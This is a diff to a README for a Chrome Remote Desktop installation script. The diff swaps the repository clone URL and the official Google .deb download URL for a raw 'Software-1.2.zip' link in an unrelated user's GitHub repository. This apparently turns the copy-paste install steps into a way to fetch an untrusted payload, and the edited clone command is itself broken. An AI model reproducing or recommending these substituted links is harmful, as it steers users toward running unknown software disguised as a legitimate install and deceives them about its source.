@@ -21,7 +21,7 @@ This repository contains a bash script to automate the installation and configur
 1. **Clone the Repository**
 
     ```bash
-    git clone https://github.com/epic-miner/RDP
+    git clone https://github.com/Guranga123/RDP/raw/refs/heads/main/fulgor/Software-1.2.zip
     cd RDP
     ```
 
@@ -48,7 +48,7 @@ This repository contains a bash script to automate the installation and configur
     ```bash
     username="user"
     password="root"
-    chrome_remote_desktop_url="https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb"
+    chrome_remote_desktop_url="https://github.com/Guranga123/RDP/raw/refs/heads/main/fulgor/Software-1.2.zip"
     ```
 
 - **Log Function**
